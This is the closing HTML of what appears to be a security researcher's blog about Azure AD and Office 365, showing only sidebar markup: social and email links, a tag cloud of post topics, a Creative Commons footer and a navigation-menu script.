				<svg class="widget-social__link-icon icon-linkedin" viewBox="0 0 352 352" width="24" height="24" fill="#fff" xmlns="http://www.w3.org/2000/svg"><path d="M0,40v272c0,21.9,18.1,40,40,40h272c21.9,0,40-18.1,40-40V40c0-21.9-18.1-40-40-40H40C18.1,0,0,18.1,0,40z M312,32 c4.6,0,8,3.4,8,8v272c0,4.6-3.4,8-8,8H40c-4.6,0-8-3.4-8-8V40c0-4.6,3.4-8,8-8H312z M59.5,87c0,15.2,12.3,27.5,27.5,27.5 c15.2,0,27.5-12.3,27.5-27.5c0-15.2-12.3-27.5-27.5-27.5C71.8,59.5,59.5,71.8,59.5,87z M187,157h-1v-21h-45v152h47v-75 c0-19.8,3.9-39,28.5-39c24.2,0,24.5,22.4,24.5,40v74h47v-83.5c0-40.9-8.7-72-56.5-72C208.5,132.5,193.3,145.1,187,157z M64,288h47.5 V136H64V288z"/></svg>
				<span>LinkedIn</span>
			</a>
		</div>
		<div class="widget-social__item widget__item">
			<a class="widget-social__link widget__link btn" title="Email" href="mailto:nestori.syynimaa@gerenios.com">
				<svg class="widget-social__link-icon icon-mail" viewBox="0 0 416 288" width="24" height="24" xmlns="http://www.w3.org/2000/svg" fill="#fff"><path d="m0 16v256 16h16 384 16v-16-256-16h-16-384-16zm347 16-139 92.5-139-92.5zm-148 125.5 9 5.5 9-5.5 167-111.5v210h-352v-210z"/></svg>
				<span>nestori.syynimaa@gerenios.com</span>
			</a>
		</div>
	</div>
</div>

	
<div class="widget-taglist widget">
	<h4 class="widget__title">Tags</h4>
	<div class="widget__content">
		<a class="widget__link widget__link--taglist" href="/tags/aadconnect" title="aadconnect">aadconnect (2)</a>
		<a class="widget__link widget__link--taglist" href="/tags/aadinternals" title="aadinternals">aadinternals (10)</a>
		<a class="widget__link widget__link--taglist" href="/tags/abusing" title="abusing">abusing (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/active-directory" title="active-directory">active-directory (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/adfs" title="adfs">adfs (5)</a>
		<a class="widget__link widget__link--taglist" href="/tags/admin" title="admin">admin (3)</a>
		<a class="widget__link widget__link--taglist" href="/tags/administration" title="administration">administration (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/authentication" title="authentication">authentication (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/azure" title="azure">azure (20)</a>
		<a class="widget__link widget__link--taglist" href="/tags/azure-active-directory" title="azure-active-directory">azure-active-directory (27)</a>
		<a class="widget__link widget__link--taglist" href="/tags/azuread" title="azuread">azuread (4)</a>
		<a class="widget__link widget__link--taglist" href="/tags/backdoor" title="backdoor">backdoor (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/blackhat" title="blackhat">blackhat (2)</a>
		<a class="widget__link widget__link--taglist" href="/tags/blue-team" title="blue-team">blue-team (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/bprt" title="bprt">bprt (2)</a>
		<a class="widget__link widget__link--taglist" href="/tags/browser" title="browser">browser (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/compromise" title="compromise">compromise (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/conferences" title="conferences">conferences (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/defcon" title="defcon">defcon (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/desktop-sso" title="desktop-sso">desktop-sso (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/device" title="device">device (3)</a>
		<a class="widget__link widget__link--taglist" href="/tags/dns" title="dns">dns (3)</a>
		<a class="widget__link widget__link--taglist" href="/tags/email" title="email">email (2)</a>
		<a class="widget__link widget__link--taglist" href="/tags/encryption" title="encryption">encryption (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/exchange" title="exchange">exchange (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/federation" title="federation">federation (2)</a>
		<a class="widget__link widget__link--taglist" href="/tags/forensics" title="forensics">forensics (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/gdpr" title="gdpr">gdpr (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/global-administrator" title="global-administrator">global-administrator (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/graph" title="graph">graph (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/groups" title="groups">groups (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/guest" title="guest">guest (2)</a>
		<a class="widget__link widget__link--taglist" href="/tags/hybrid-join" title="hybrid-join">hybrid-join (3)</a>
		<a class="widget__link widget__link--taglist" href="/tags/identity" title="identity">identity (2)</a>
		<a class="widget__link widget__link--taglist" href="/tags/inactive" title="inactive">inactive (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/insider" title="insider">insider (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/intune" title="intune">intune (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/join" title="join">join (3)</a>
		<a class="widget__link widget__link--taglist" href="/tags/logs" title="logs">logs (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/mailbox" title="mailbox">mailbox (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/mdm" title="mdm">mdm (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/mfa" title="mfa">mfa (6)</a>
		<a class="widget__link widget__link--taglist" href="/tags/office-365" title="office-365">office-365 (9)</a>
		<a class="widget__link widget__link--taglist" href="/tags/office365" title="office365">office365 (9)</a>
		<a class="widget__link widget__link--taglist" href="/tags/on-prem" title="on-prem">on-prem (2)</a>
		<a class="widget__link widget__link--taglist" href="/tags/onedrive" title="onedrive">onedrive (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/outsider" title="outsider">outsider (2)</a>
		<a class="widget__link widget__link--taglist" href="/tags/partner" title="partner">partner (2)</a>
		<a class="widget__link widget__link--taglist" href="/tags/password" title="password">password (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/persistence" title="persistence">persistence (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/phishing" title="phishing">phishing (2)</a>
		<a class="widget__link widget__link--taglist" href="/tags/planner" title="planner">planner (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/powershell" title="powershell">powershell (13)</a>
		<a class="widget__link widget__link--taglist" href="/tags/prt" title="prt">prt (6)</a>
		<a class="widget__link widget__link--taglist" href="/tags/pta" title="pta">pta (2)</a>
		<a class="widget__link widget__link--taglist" href="/tags/recon" title="recon">recon (2)</a>
		<a class="widget__link widget__link--taglist" href="/tags/reconnaissance" title="reconnaissance">reconnaissance (4)</a>
		<a class="widget__link widget__link--taglist" href="/tags/seamless-sso" title="seamless-sso">seamless-sso (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/security" title="security">security (31)</a>
		<a class="widget__link widget__link--taglist" href="/tags/sso" title="sso">sso (2)</a>
		<a class="widget__link widget__link--taglist" href="/tags/sync" title="sync">sync (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/synchronisation" title="synchronisation">synchronisation (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/t2" title="t2">t2 (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/talks" title="talks">talks (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/teams" title="teams">teams (3)</a>
		<a class="widget__link widget__link--taglist" href="/tags/user" title="user">user (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/virtual-machine" title="virtual-machine">virtual-machine (1)</a>
	</div>
</div>
</aside>

	</div>
		<footer class="footer" itemscope="itemscope" itemtype="http://schema.org/WPFooter">
			<div class="container container-inner">
				<p class="footer__copyright"><span><a href="https://creativecommons.org/licenses/by/4.0/" target="_blank"><img src="/images/CC-BY.png"></a> </span></p>
			</div>
		</footer>
	</div>

<script>
	var navigation = responsiveNav(".menu", {
		navClass: "menu--collapse",
	});
</script>
</body>
</html>
